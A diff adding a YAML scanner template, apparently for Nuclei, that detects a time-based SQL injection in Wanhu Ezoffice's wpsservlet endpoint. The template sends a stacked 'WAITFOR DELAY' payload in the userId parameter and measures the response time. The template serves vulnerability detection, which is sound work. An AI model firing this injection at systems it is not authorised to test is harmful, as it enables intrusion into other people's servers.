@@ -1,0 +1,44 @@
+id: poc-yaml-wanhu-oa-wpsservlet-sqli
+info:
+  name: 万户Ezoffice wpsservlet SQL注入
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template identifies SQL injection vulnerability in 万户Ezoffice wpsservlet.
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+http:
+  - id: check-login-page
+    method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/login.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'whirRootPath = "/defaultroot"'
+          - "login.jsp"
+
+  - id: check-sqli
+    method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/wpsservlet?option=getSign&userId=1;WAITFOR%20DELAY%20%270:0:{{t1}}%27--&orgIdString=1&domainId=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[]"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
